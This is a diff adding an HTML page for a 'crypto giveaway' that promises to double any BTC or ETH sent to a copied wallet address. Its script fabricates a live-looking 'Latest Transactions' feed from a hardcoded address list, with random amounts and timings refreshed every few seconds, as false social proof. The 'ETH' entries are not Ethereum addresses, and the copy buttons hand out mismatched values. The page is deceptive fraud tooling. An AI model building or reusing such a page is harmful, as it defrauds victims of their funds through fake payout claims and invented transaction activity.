@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Home</title>
+    <script src="https://kit.fontawesome.com/a4bf4d7b7a.js" crossorigin="anonymous"></script>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    <style>
+        .navbar {
+            /* background-image: linear-gradient(rgb(160 159 159) 0%, rgb(0 0 0) 100%); */
+            background-color: #f47e27;
+        }
+
+        .navbar-nav {
+            gap: 30px;
+        }
+        .buttion{
+            background-color: white !important;
+        }
+        .buttion:hover{
+            background-color: black !important;
+            color: white;
+        }
+        .btn {
+            border-radius: 10px;
+            background-color: #f47e27;
+        }
+
+        .section1 {
+            /* background-image: linear-gradient(rgb(199, 184, 184) 0%, rgb(236, 240, 249) 100%); */
+            background-image: linear-gradient(0deg,rgba(237, 237, 237, 1) 0%, rgba(242, 242, 242, 1) 100%);
+        }
+
+        .section1_content {
+            align-content: center;
+        }
+
+        .section_child {
+            padding: 60px 0px;
+        }
+        .card-body{
+            line-height: 30px;
+            margin: 20px 0px ;
+            /* background-color: white; */
+            /* border: 1px solid black; */
+        }
+        .cards_para{
+            font-size: 15px;
+        }
+        .pagination {
+            justify-content: center;
+        }
+        /* div{
+            border: 1px solid black;
+        } */
+        body{
+            background-image: linear-gradient(0deg, rgba(237, 237, 237, 1) 0%, rgba(242, 242, 242, 1) 100%);
+            /* background-image: url("trading.jpg") */
+        }
+        .card-group{
+            gap: 30px;
+        }
+        .crypto-logo {
+            width: 30px;
+            height: 30px;
+        }
+        .btc-address{
+            margin-left: 0 !important;
+        }
+        table {
+            background: white;
+        }
+        .crypto-logo {
+            width: 24px;
+            height: 24px;
+        }
+        #pagination {
+            cursor: pointer;
+            user-select: none;
+        }
+        thead tr {
+            background-color: #f47e27;
+            color: white;
+        }
+        .navbar-links{
+            font-size: 19px;
+            color: white;
+            font-weight: 400;
+        }
+        .navbar-links:hover{
+            color: black;
+        }
+        .section1-heading{
+            font-size: 56px !important;
+        }
+        .section1-para{
+            font-weight: 500;
+        }
+        .participate-buttion{
+            color: white !important;
+        }
+        .hover-lift:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
+        }
+        /* .section3{
+            font-weight: 330;
+        } */
+        @media (max-width: 575.98px) {
+            .section1_heading>h1 {
+                font-size: 60px;
+            }
+
+            .section1_para>p {
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <nav class="navbar navbar-expand-lg">
+        <img src="logo1.png" height="mx-auto" width="mx-auto" class="ms-lg-5">
+        <div class="container me-5">
+            <!-- <a href="#" class="navbar-brand"><img src="logo1.png" alt=""></a> -->
+            <div class="d-none d-lg-inline">
+                <ul class="navbar-nav">
+                    <li class="navbar-item"><a href="#giveway-scroll" class="nav-link navbar-links">Giveaway</a></li>
+                    <li class="navbar-item"><a href="#info-scroll" class="nav-link navbar-links">Info</a></li>
+                    <li class="navbar-item"><a href="#instruction-scroll" class="nav-link navbar-links">Instruction</a></li>
+                    <li class="navbar-item"><a href="#participate-scroll" class="nav-link navbar-links">Participate</a></li>
+                    <li class="navbar-item"><a href="#transaction-scroll" class="nav-link navbar-links">Transaction</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="d-none d-lg-inline">
+            <button onclick="document.getElementById('participate-scroll').scrollIntoView({ behavior: 'smooth' });" type="button" class="btn buttion me-5">Participate</button>
+        </div>
+    </nav>
+    <div id="giveway-scroll" class="section1">
+        <div class="container">
+            <div class="d-flex section_child justify-content-between">
+                <div class="section1_content">
+                    <div class="section1_heading">
+                        <h1 class=" text-center text-sm-start fw-bold section1-heading">BIGGEST CRYPTO <br class="d-none d-lg-block"> GIVEAWAY OF <br class="d-none d-lg-block"> $100 000 000</h1>
+                    </div>
+                    <div class="my-3 section1_para">
+                        <p id="instruction-scroll" class="text-center text-sm-start py-3 lh-lg section1-para">During this unique event, You have the
+                            opportunity to take a<br> share of 1 000 BTC & 10 000 ETH. Have a look at the rules<br>and
+                            don't miss out on this. You can only participate once!</p>
+                    </div>
+                    <div class="text-center text-sm-start">
+                        <button onclick="document.getElementById('participate-scroll').scrollIntoView({ behavior: 'smooth' });" type="button" class="btn participate-buttion">Participate</button>
+                    </div>
+                </div>
+                <div class="section_content_img">
+                    <img src="logo2.jpg" width="550px" class=" d-none d-lg-inline ">
+                </div>
+            </div>
+        </div>
+    </div>
+    <div>
+
+        <div class="mt-3">
+            <div class="d-flex justify-content-center p-1 p-lg-5">
+                <h3 class="fw-bold">Instruction <span style="color: #ff6715;">for</span> Participation</h3>
+            </div>
+            <div class="container">
+                <div class="row mt-3 mb-5">
+                    <div class="col-12 col-sm-6 col-lg-3 mb-4">
+                        <div class="card hover-lift shadow-sm h-100">
+                            <div class="card-body">
+                                <h1 class="card-title text-center"><span style="color: #ff6715;"><i
+                                            class="fa-solid fa-wallet"></i></span></h1>
+                                <p id="info-scroll" class="card-text text-center">To Participate, You can do the<br> transaction
+                                    using any wallet or<br> exchange!.</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-12 col-sm-6 col-lg-3 mb-4">
+                        <div class="card hover-lift shadow-sm h-100">
+                            <div class="card-body">
+                                <h1 class="card-title text-center"><span style="color: #ff6715;"><i
+                                            class="fa-solid fa-share-from-square"></i></span></h1>
+                                <p class="card-text text-center">Send their Desired number of Coin<br> to the special address
+                                    below
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-12 col-sm-6 col-lg-3 mb-4">
+                        <div class="card hover-lift shadow-sm h-100">
+                            <div class="card-body">
+                                <h1 class="card-title text-center"><span style="color: #ff6715;"><i
+                                            class="fa-regular fa-circle-check"></i></span></h1>
+                                <p class="card-text text-center">Once the recieve your transcation,<br> the doubled amount will
+                                    be
+                                    send<br> back to You immediately</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-12 col-sm-6 col-lg-3 mb-4">
+                        <div class="card hover-lift shadow-sm h-100">
+                            <div class="card-body">
+                                <h1 class="card-title text-center"><span style="color: #ff6715;"><i
+                                            class="fa-solid fa-gift"></i></span></h1>
+                                <p class="card-text text-center">Once the recieve your transcation,<br> the doubled amount will
+                                    be
+                                    send<br> back to You immediately</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <div>
+        <div class="d-flex justify-content-center py-3 my-4 mt-lg-5">
+            <h3 class="fw-bold">Rules <span style="color: #ff6715;">&</span> Regulation</h3>
+        </div>
+        <div class="container">
+            <div class="row">
+                <div class="col-12 col-md-6 mb-4">
+                    <div class="card hover-lift shadow-sm h-100">
+                        <h2 class="text-center card-title mt-4 display-5 section3">About Giveaway</h2>
+                        <p class="text-left card-text mt-2 mb-5 px-4 lh-lg">We believe that <span
+                                style="color: #ff6715;">BTC</span> & <span style="color: #ff6715;">ETH</span> will make the
+                            world more fair. To speed up the process of cryptocurrency mass adoption, we decided to run
+                            <span style="color: #ff6715;">1000 BTC</span> & <span style="color: #ff6715;">10 000 ETH</span>
+                            giveaway for all crypto holders!</p>
+                    </div>
+                </div>
+                <div class="col-12 col-md-6 mb-4">
+                    <div class="card hover-lift shadow-sm h-100">
+                        <h2 class="text-center card-title mt-4 display-5">How to Participate?</h2>
+                        <p class="text-left card-text mt-2 mb-5 px-4 lh-lg">To participate you just need to send any amount
+                            from (<span style="color: #ff6715;">0,01 BTC</span> to <span style="color: #ff6715;">15
+                                BTC</span>) or (<span style="color: #ff6715;">0,5 ETH</span> to <span
+                                style="color: #ff6715;">200 ETH</span>) to the contribution address, and we will immediately
+                            send back the double amount (<span style="color: #ff6715;">0,02 BTC</span> to <span
+                                style="color: #ff6715;">30 BTC</span>) or (<span style="color: #ff6715;">1 ETH</span> to
+                            <span style="color: #ff6715;">400 ETH</span>) (<span style="color: #ff6715;">x2</span>) to the
+                            address you sent it from</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div  id="participate-scroll" class="container mt-5">
+        <div class="row">
+
+            <!-- BTC Card -->
+            <div class="col-md-6 mb-4">
+                <div class="card p-4 h-100">
+                    <h5 class="mb-3">You Will Send (BTC)</h5>
+                    <div class="d-flex align-items-center mb-3">
+                        <img src="btc.jpg" alt="BTC" style="width: 24px; height: 24px;" class="me-2">
+                        <input type="number" class="form-control w-50" placeholder="Enter BTC amount" id="btcInput">
+                    </div>
+                    <div class="row">
+                        <div class="col-6">
+                            <label class="form-label">Your Profit</label>
+                            <h4 class="text-success">200%</h4>
+                        </div>
+                        <div class="col-6 d-flex flex-column">
+                            <label class="form-label">You Receive</label>
+                            <div class="d-flex align-items-center">
+                                <img src="btc.jpg" alt="BTC" style="width: 20px; height: 20px;" class="me-2">
+                                <span id="btcOutput">0.0000</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ETH Card -->
+            <div class="col-md-6 mb-4">
+                <div class="card p-4 h-100">
+                    <h5 class="mb-3">You Will Send (ETH)</h5>
+                    <div class="d-flex align-items-center mb-3">
+                        <img src="eth.jpg" alt="ETH" style="width: 24px; height: 24px;" class="me-2">
+                        <input type="number" class="form-control w-50" placeholder="Enter ETH amount" id="ethInput">
+                    </div>
+                    <div class="row">
+                        <div class="col-6">
+                            <label class="form-label">Your Profit</label>
+                            <h4 class="text-success">200%</h4>
+                        </div>
+                        <div class="col-6 d-flex flex-column">
+                            <label class="form-label">You Receive</label>
+                            <div class="d-flex align-items-center">
+                                <img src="eth.jpg" alt="ETH" style="width: 20px; height: 20px;" class="me-2">
+                                <span id="ethOutput">0.0000</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <div class="d-flex justify-content-center py-3 mt-3 mt-lg-5 mb-3">
+        <h3 class="fw-bold">Participate <span style="color: #ff6715;">in</span> giveaway</h3>
+    </div>
+    <div class="container">
+        <div class="row">
+            <div class="card-group justify-content-center">
+                <div class="card mb-3" style="max-width: 540px;">
+                    <div class="row g-0">
+                        <div class="col-md-4">
+                            <img src="QR_Code_Sample.png"
+                                class="img-fluid rounded-start img-fluid d-block mx-auto mx-md-0" alt="...">
+                        </div>
+                        <div class="col-md-8">
+                            <div class="card-body">
+                                <h5 class="card-title text-center text-md-start">Send your BTC to the address for X2
+                                    back</h5>
+                                <!-- <input type="text" id="walletAddress" class="form-control mb-3 w-75 w-md-50 mx-auto btc-address" value="bc1qzljcc9j6njpgrxjzjjeq87xnga0xdnxjsy29uu" readonly> -->
+                                <!-- <p class="card-text text-center text-md-start">bc1qzljcc9j6njpgrxjzjjeq87xnga0xdnxjsy29uu</p> -->
+                                <div class="text-center text-md-start">
+                                    <button class="btn btn-success" onclick="copyHiddenAddress1()">Copy Address</button>
+                                </div>
+                                <div id="copyMsg1" class="mt-3 text-success fw-semibold" style="display: none;">✅
+                                    Address copied to clipboard!</div>
+                                <p class="card-text text-center text-md-start"><small class="text-muted ">Last updated 3
+                                        mins ago</small></p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="card mb-3" style="max-width: 540px;">
+                    <div class="row g-0">
+                        <div class="col-md-4">
+                            <img src="QR_Code_Sample.png"
+                                class="img-fluid rounded-start img-fluid d-block mx-auto mx-md-0" alt="...">
+                        </div>
+                        <div class="col-md-8">
+                            <div class="card-body">
+                                <h5 class="card-title text-center text-md-start">Send your ETH to the address for X2
+                                    back</h5>
+                                <!-- <input type="text" id="walletAddress2" class="form-control mb-3 w-75 w-md-50 mx-auto btc-address" value="bc1qzljcc9j6njpgrxjzjjeq87xnga0xdnxjsy29uu" readonly> -->
+                                <!-- <p class="card-text text-center text-md-start">bc1qzljcc9j6njpgrxjzjjeq87xnga0xdnxjsy29uu</p> -->
+                                <div class="text-center text-md-start">
+                                    <button class="btn btn-success" onclick="copyHiddenAddress()">Copy Address</button>
+                                </div>
+                                <div id="copyMsg2" class="mt-3 text-success fw-semibold" style="display: none;">✅
+                                    Address copied to clipboard!</div>
+                                <p class="card-text text-center text-md-start"><small class="text-muted">Last updated 3
+                                        mins ago</small></p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- <div class="container mt-5">
+    <h3 class="mb-4">Latest Transactions</h3>
+    <table class="table table-bordered">
+        <thead>
+            <tr>
+                <th>Logo</th>
+                <th>Address</th>
+                <th>Time</th>
+                <th>Amount</th>
+            </tr>
+        </thead>
+        <tbody id="transactionTable"> -->
+    <!-- Dynamic rows will appear here -->
+    <!-- </tbody>
+    </table>
+    <nav>
+        <ul class="pagination" id="pagination"></ul>
+    </nav>
+</div> -->
+
+    <div class="container">
+        <h2  id="transaction-scroll" class="my-4">Latest Transactions</h2>
+        <table class="table table-bordered">
+            <thead>
+                <tr>
+                    <th>Type</th>
+                    <th>Address</th>
+                    <th>Time</th>
+                    <th>Amount</th>
+                </tr>
+            </thead>
+            <tbody id="transaction-body"></tbody>
+        </table>
+
+        <nav>
+            <ul class="pagination" id="pagination"></ul>
+        </nav>
+    </div>
+
+
+
+
+    <nav class="navbar navbar-expand-lg">
+        <div class="container mb-4">
+            <!-- <a href="#" class="navbar-brand"><img src="logo1.png" alt=""></a> -->
+
+            <div>
+                <!-- <button type="button" class="btn">Participate</button> -->
+            </div>
+        </div>
+    </nav>
+<script>
+    document.getElementById("btcInput").addEventListener("input", function () {
+        const input = parseFloat(this.value) || 0;
+        document.getElementById("btcOutput").textContent = (input * 2).toFixed(4);
+    });
+
+    document.getElementById("ethInput").addEventListener("input", function () {
+        const input = parseFloat(this.value) || 0;
+        document.getElementById("ethOutput").textContent = (input * 2).toFixed(4);
+    });
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+    anchor.addEventListener("click", function (e) {
+        e.preventDefault();
+        const target = document.querySelector(this.getAttribute("href"));
+        if (target) {
+        target.scrollIntoView({
+            behavior: "smooth",
+            block: "start"
+        });
+        }
+    });
+    });
+
+
+    // const rowsPerPage = 12;
+    // const maxPages = 5;
+    // const allTransactions = [];
+    // let currentPage = 1;
+
+    // const logos = {
+    //     BTC: 'BTC.jpeg',    
+    //     ETC: 'BTC.jpeg'
+    // };
+
+    // function getRandomCrypto() {
+    //     return Math.random() > 0.5 ? 'BTC' : 'ETC';
+    // }
+
+    // function getRandomAddress() {
+    //     return '0x' + Math.random().toString(36).substring(2, 34);
+    // }
+
+    // function getRandomAmount() {
+    //     return (Math.random() * 0.01).toFixed(6);
+    // }
+
+    // function getTimeAgo() {
+    //     const seconds = Math.floor(Math.random() * 60) + 1;
+    //     return `${seconds} sec ago`;
+    // }
+
+    // function addTransaction() {
+    //     const crypto = getRandomCrypto();
+    //     const tx = {
+    //         logo: logos[crypto],
+    //         address: getRandomAddress(),
+    //         time: getTimeAgo(),
+    //         amount: `${getRandomAmount()} ${crypto}`
+    //     };
+
+    //     allTransactions.unshift(tx);
+
+    //     if (allTransactions.length > rowsPerPage * maxPages) {
+    //         allTransactions.pop();
+    //     }
+
+    //     renderTable(currentPage);
+    //     renderPagination();
+    // }
+
+    // function renderTable(page) {
+    //     const start = (page - 1) * rowsPerPage;
+    //     const end = start + rowsPerPage;
+    //     const displayTx = allTransactions.slice(start, end);
+
+    //     const tbody = document.getElementById("transactionTable");
+    //     tbody.innerHTML = '';
+
+    //     displayTx.forEach(tx => {
+    //         const row = `
+    //     <tr>
+    //       <td><img src="${tx.logo}" alt="logo" class="crypto-logo"></td>
+    //       <td>${tx.address}</td>
+    //       <td>${tx.time}</td>
+    //       <td>${tx.amount}</td>
+    //     </tr>
+    //   `;
+    //         tbody.insertAdjacentHTML("beforeend", row);
+    //     });
+    // }
+
+    // function renderPagination() {
+    //     const totalPages = Math.ceil(allTransactions.length / rowsPerPage);
+    //     const pagination = document.getElementById("pagination");
+    //     pagination.innerHTML = '';
+
+    //     for (let i = 1; i <= totalPages; i++) {
+    //         const li = document.createElement('li');
+    //         li.className = `page-item ${i === currentPage ? 'active' : ''}`;
+    //         li.innerHTML = `<a class="page-link" href="#">${i}</a>`;
+    //         li.addEventListener('click', (e) => {
+    //             e.preventDefault();
+    //             currentPage = i;
+    //             renderTable(currentPage);
+    //             renderPagination();
+    //         });
+    //         pagination.appendChild(li);
+    //     }
+    // }
+
+    // // Initial
+    // for (let i = 0; i < 20; i++) addTransaction();
+
+    // // New row every 10–15 sec
+    // function randomInterval() {
+    //     const delay = Math.floor(Math.random() * 5000) + 10000;
+    //     setTimeout(() => {
+    //         addTransaction();
+    //         randomInterval();
+    //     }, delay);
+    // }
+
+ // Address list (type, address)
+  const addresses = [
+    ["btc","135nf39nEAuDLkTxGWKRUfYpiiFjjbrQkr"],
+    ["eth","KyRWBv7BksFeZ4WJ6qw65N2SDzN4DBMWrc7hD3HYUamhp8t8YLq7"],
+    ["btc","17TrhUwoUsviQjp9SUG611r3vfezW8cF7w"],
+    ["eth","L4kurx4iZnJ8MQMxGHf6duLws1WmXNKLTQh2UpUPiQdSbsQGdndX"],
+    ["btc","1DHAYWgdbWwwtwgmc5Xvqa6Ey9auWNBwcN"],
+    ["eth","L3hf23NYBqdnnjUkwhd7RmoHreSGZ5qoxRGKH4k7wgmSHg91iRHu"],
+    ["btc","14JCmrfkBYZpiwMrtihq5NbtNcawgdRHwN"],
+    ["eth","L1Ui4JvBuFpr7sHhatuzgDbpG7LeXQqCvFknQkr1EZoevxsTm5FC"],
+    ["btc","1F7bK2drfBfMFk8vuEqaUZGiFFKLkpqSEK"],
+    ["eth","KwqfekGphuVNTvKZgMLgVnFTRbLKWmaSb2FbNJ7hhju6r2iEqf1g"],
+    ["btc","12pkLzHqeM3VSY5wtetShqSgkKjiC7UGfp"],
+    ["eth","Ky2vAxe5ogUXAveSgu8zC4evBtY991Lp51FpW5uxtKW9jkmnNDSt"],
+    ["btc","1817Y3szv9iE9RR4HNu5V3kyx971EhsZVP"],
+    ["eth","L17py58NFtAgdJxX2gAQwdR4Gcn8PpDB1BFb57B3VGTGVXBMj9qh"],
+    ["btc","1DYhCKbuSFDLNHkjeeqFmrzLC11j4B7CQT"],
+    ["eth","KzV3u4GuuxXicajM51m22sNQkDzygoetddU8Rd3w3yRieW5d3ac7"],
+    ["btc","16TtSweHmajA4nLsADJATG65dZZNTiy224"],
+    ["eth","Kyka4ZwX5cG49u2wbtxpqqup4ckP6KjZY1ZdXvWHxFRvRmQjo1H4"],
+    ["btc","1GZAYH3aSQXMG6kQgQDyKPanXJm7ZrYaWa"],
+    ["eth","L1XPhWSfv8EoaXNdJRLjrWKpd3fafzKSC4pyT8ixwFek3u2qmzkC"],
+    ["btc","1GJJnXCSumnMK8N7KuuatLXH4xc7VcUT9Q"],
+    ["eth","Kx6UQgAqr3evJwYiEzgn2WZuYf6u1jw9fLUKVeCQZT4sj6HXvnAk"],
+    ["btc","1CAHkvkxZn9tezet3jfnLQJaU5J4QBiLS7"],
+    ["eth","L1B9qoC9gQe2sovQYTRGREPvTu4W1fjN2dZCSfteCsr9GWZA9FPP"],
+    ["btc","1ASCejMLVvZTZUE86Dd4quDe8j1qtL8QY4"],
+    ["eth","L4wWteCsry3PW3HBaGgurXvb8y9uVHfGoUCAVU53wUihGzCqvHu2"],
+    ["btc","1EwJFMNhovPBcUBYnjdn3Y5kwYwjHPD7XC"],
+    ["eth","L1zdeBPqTfcWo7TVwAhaqU9Fx5ujvaNBzuyb66KMBnAXu7np5yp6"],
+    ["btc","1At9SeDpAdbhiop8u9C4GirR4tzcKgCC5N"],
+    ["eth","L5iBcYtpVsp2U2CVqyBeDidBHbNZPZLPkUEV4J8C5c9zdEzNEFB1"],
+    ["btc","1DRNVv3ZPgcKieTHGiGidH5q9qJikQHiPz"],
+    ["eth","L1nFaTF7gieGMUHQSmGG6taRFpJ57goKqsMKQvdrRabEcuPu1Yb2"],
+    ["btc","1PAASbt337CeKRT8YCNgMceUYAZogMexDp"],
+    ["eth","L2R36w8vcXa3LXsPMRE3t2KF7d4TpTWyVqzUrpSNV2ybNU9sSfoa"],
+    ["btc","1M5VioXbuqPhQiL31g85AaGHYMSTm15m4J"],
+    ["eth","L5kUERg5SYD7Ujy7PFyioJgChtqXooqvuMFjhVTnjnuWunb4uofG"],
+    ["btc","1LtQBNnoreszL14nWW4uBthwzQcNWyyezg"],
+    ["eth","Kzcq9S8yq7WFuLCzjArS6a8qc1HamBKasbcgXSm3SF1soasf2jCP"],
+    ["btc","1Hhszu6NhjL45ni8pwwhA7kkUJvHdscPjm"],
+    ["eth","KxjTWC3Vnna6ie8QMYR8Z7nPRrHEPAv91ihRpcdV4ebjNeZJKP6x"],
+    ["btc","1HwJaKRLVgAnTZv4WypmQDWbw7MVA7UYkk"],
+    ["eth","L1MyAXgNBfA85X1gmfAb9gzb82kokfK7hp9mQ6BahHVJUEs9EUvz"],
+    ["btc","1GKyx9QmfmXQcrhGU4FyH4xf3Zqm5PrfUQ"],
+    ["eth","L2nhjS46Dc27MBp8iHMgiqZBXVVRtF4d6NB1tTqv1HYd8YSYHqN7"],
+  ];
+
+  const pageSize = 12;
+  const totalTransactions = pageSize * 2; // 2 pages
+
+  let usedAddressIndices = new Set();
+
+  function getRandomInt(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+  }
+
+  // Exchange rates for conversion USD to crypto
+  const exchangeRates = {
+    btc: 1 / 30000,  // 1 BTC = 30,000 USD (example)
+    eth: 1 / 2000,   // 1 ETH = 2,000 USD (example)
+  };
+
+  // Amount between 300 and 120,000 dollars converted to BTC or ETH
+  function generateAmount(type) {
+    const amountUSD = getRandomInt(300, 12000);
+    const cryptoAmount = amountUSD * exchangeRates[type];
+    const decimals = type === "btc" ? 6 : 5;
+    return `${cryptoAmount.toFixed(decimals)} ${type.toUpperCase()}`;
+  }
+
+  // Generate initial time offsets with first 2 rows having 10-25s difference, all random >0 and ascending
+  function generateInitialTimeOffsets() {
+    let offsets = [];
+    offsets[0] = getRandomInt(10, 25);
+    offsets[1] = offsets[0] + getRandomInt(10, 25);
+
+    for (let i = 2; i < totalTransactions; i++) {
+      offsets[i] = offsets[i - 1] + getRandomInt(10, 25);
+    }
+    return offsets;
+  }
+
+  function formatTiming(secondsAgo) {
+    if (secondsAgo < 60) {
+      return `${secondsAgo}s ago`;
+    } else {
+      const minutes = Math.floor(secondsAgo / 60);
+      return `${minutes}m ago`;
+    }
+  }
+
+  function pickUniqueAddressIndex() {
+    let available = [];
+    for (let i = 0; i < addresses.length; i++) {
+      if (!usedAddressIndices.has(i)) {
+        available.push(i);
+      }
+    }
+    if (available.length === 0) {
+      usedAddressIndices.clear();
+      for (let i = 0; i < addresses.length; i++) {
+        available.push(i);
+      }
+    }
+    const idx = available[getRandomInt(0, available.length - 1)];
+    usedAddressIndices.add(idx);
+    return idx;
+  }
+
+  function createTransaction(timeOffsetSeconds) {
+    const idx = pickUniqueAddressIndex();
+    const [type, address] = addresses[idx];
+    return {
+      type,
+      address,
+      timeOffset: timeOffsetSeconds,
+      amount: generateAmount(type),
+      addressIndex: idx,
+    };
+  }
+
+  let transactions = [];
+
+  function saveTransactions() {
+    localStorage.setItem("transactionsData", JSON.stringify(transactions));
+  }
+
+  function loadTransactions() {
+    const data = localStorage.getItem("transactionsData");
+    if (!data) return null;
+    try {
+      const parsed = JSON.parse(data);
+      if (Array.isArray(parsed) && parsed.length === totalTransactions) {
+        return parsed;
+      }
+    } catch {
+      return null;
+    }
+    return null;
+  }
+
+  function initializeTransactions() {
+    usedAddressIndices.clear();
+    const saved = loadTransactions();
+    if (saved) {
+      transactions = saved;
+      usedAddressIndices = new Set(transactions.map(tx => tx.addressIndex));
+    } else {
+      const timeOffsets = generateInitialTimeOffsets();
+      transactions = [];
+      for (let i = 0; i < totalTransactions; i++) {
+        transactions.push(createTransaction(timeOffsets[i]));
+      }
+      saveTransactions();
+    }
+  }
+
+  function updateTimings(newTxInterval) {
+    for (let tx of transactions) {
+      tx.timeOffset += newTxInterval;
+    }
+  }
+
+  function addNewTransaction() {
+    const newTxInterval = getRandomInt(10, 25);
+    updateTimings(newTxInterval);
+
+    const removeIndex = totalTransactions - 1;
+    usedAddressIndices.delete(transactions[removeIndex].addressIndex);
+    transactions.pop();
+
+    const newTx = createTransaction(newTxInterval);
+    transactions.unshift(newTx);
+
+    saveTransactions();
+  }
+
+  let currentPage = 1;
+
+  function renderPagination() {
+    const paginationEl = document.getElementById("pagination");
+    paginationEl.innerHTML = "";
+    for (let p = 1; p <= 2; p++) {
+      const li = document.createElement("li");
+      li.classList.add("page-item");
+      if (p === currentPage) {
+        li.classList.add("active");
+      }
+      li.innerHTML = `<a class="page-link">${p}</a>`;
+      li.addEventListener("click", () => {
+        currentPage = p;
+        renderTable();
+        renderPagination();
+      });
+      paginationEl.appendChild(li);
+    }
+  }
+
+  function renderTable() {
+    const tbody = document.getElementById("transaction-body");
+    tbody.innerHTML = "";
+
+    const start = (currentPage - 1) * pageSize;
+    const end = start + pageSize;
+
+    for (let i = start; i < end; i++) {
+      const tx = transactions[i];
+      const tr = document.createElement("tr");
+
+// Logo cell
+const tdLogo = document.createElement("td");
+const img = document.createElement("img");
+img.classList.add("crypto-logo");
+img.alt = tx.type.toUpperCase();
+img.src = tx.type === "btc" 
+  ? "btc.jpg"    // local BTC image file
+  : "eth.jpg";   // local ETH image file
+tdLogo.appendChild(img);
+tr.appendChild(tdLogo);
+
+
+      // Address cell
+      const tdAddress = document.createElement("td");
+      tdAddress.textContent = tx.address;
+      tr.appendChild(tdAddress);
+
+      // Time cell
+      const tdTime = document.createElement("td");
+      tdTime.textContent = formatTiming(tx.timeOffset);
+      tr.appendChild(tdTime);
+
+      // Amount cell
+      const tdAmount = document.createElement("td");
+      tdAmount.textContent = tx.amount;
+      tr.appendChild(tdAmount);
+
+      tbody.appendChild(tr);
+    }
+  }
+
+  initializeTransactions();
+  renderTable();
+  renderPagination();
+
+  // Add new transaction every 10 to 25 seconds
+  setInterval(() => {
+    addNewTransaction();
+    renderTable();
+    renderPagination();
+  }, getRandomInt(10000, 25000));
+
+
+
+    
+    // for BITCOIN AND ETHERIUM BUTTION Clipboard
+
+    randomInterval();
+      function copyAddress() {
+        const addressInput = document.getElementById("walletAddress");
+        addressInput.select();
+        addressInput.setSelectionRange(0, 99999); // For mobile
+        navigator.clipboard.writeText(addressInput.value).then(() => {
+        const msg = document.getElementById("copyMsg");
+        msg.style.display = "block";
+        setTimeout(() => {
+        msg.style.display = "none";
+        }, 2000);
+    });
+    
+    }
+        function copyHiddenAddress() {
+        const address = "bc1qzljcc9j6njpgrxjzjjeq87xnga0xdnxjsy29uu"; // hidden address
+        navigator.clipboard.writeText(address).then(() => {
+        const msg = document.getElementById("copyMsg2");
+        msg.style.display = "block";
+        setTimeout(() => {
+            msg.style.display = "none";
+        }, 2000);
+        });
+    }
+        function copyHiddenAddress1() {
+        const address = "will make the world more fair."; // hidden address
+        navigator.clipboard.writeText(address).then(() => {
+        const msg = document.getElementById("copyMsg1");
+        msg.style.display = "block";
+        setTimeout(() => {
+            msg.style.display = "none";
+        }, 2000);
+        });
+    }
+
+
+
+</script>
+
+
+</body>
+
+</html>
